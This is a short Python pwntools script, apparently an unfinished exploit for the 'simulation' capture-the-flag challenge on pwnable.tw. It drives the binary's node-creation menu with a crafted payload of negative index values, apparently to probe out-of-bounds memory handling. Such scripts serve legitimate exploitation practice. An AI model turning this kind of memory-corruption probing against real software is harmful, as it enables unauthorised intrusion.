#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("simulation")

local = True 
if local:
    p = process("./simulation")
    gdb.attach(p,'''b*new_node+804\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./simulation', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def new_node(idx, num_cmd, next_node, command, booll, handle):
    sla(b'>', b'1')
    sla(b':', str(idx))

    sla(b'Number of command: ', str(num_cmd))   # v7 < 0xf
    '''
    ptr = calloc(56 * v7 + 24, 1uLL);
    ptr[2] = v7;
    ptr[3] = v2;
    '''
    sla(b'Next node:', str(next_node))               # v2 < 0xff
    sla(b'Fill command list:', command)
    if booll == True:
      sla(b'Use default handler? (y/n):', b'y')
      sla(b'Input error handler:', str(handle))
    else:
      sla(b'Use default handler? (y/n): ', b'n')
    log.info('New_node_done!!!')

def run(node_head):
    sla(b'>', b'2')
    sla(b'Where to start?', str(node_head))           # 0 < node_head  < 0x100
    log.info('Run_done!!!')

#check_fuc     
#type | #val
payload = flat(
    1,
    2,-1,
    2,-2,
    2,-3,
    1,
    2,-1,
    2,-2,
    2,-3
)
new_node(1, 2, 10, payload, True, 2)
p.interactive()